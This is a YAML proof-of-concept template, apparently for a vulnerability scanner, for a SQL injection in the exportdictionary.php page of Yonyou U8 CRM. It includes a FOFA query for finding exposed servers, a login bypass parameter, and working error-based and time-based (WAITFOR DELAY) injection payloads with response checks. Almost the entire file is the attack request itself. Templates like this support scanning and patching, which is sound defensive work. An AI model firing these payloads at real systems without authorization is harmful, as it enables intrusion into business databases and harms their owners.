id: poc-yaml-yongyon-u8-crm-exportdictionary-php-sqli
info:
  name: 用友U8CRM exportdictionary.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: body="用友U8CRM"
variables:
  t1: random_int(2,6)
  t2: t1 + 2
requests:
- method: GET
  path: /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27
  expression: status_code == 200 && contains(body,"Database error")
- method: GET
  path: /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  headers:
    Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
  expression: status_code == 200 && contains(body,"delete from") && !contains(body,"<")
    && duration > t1 && duration < t2
transport: http
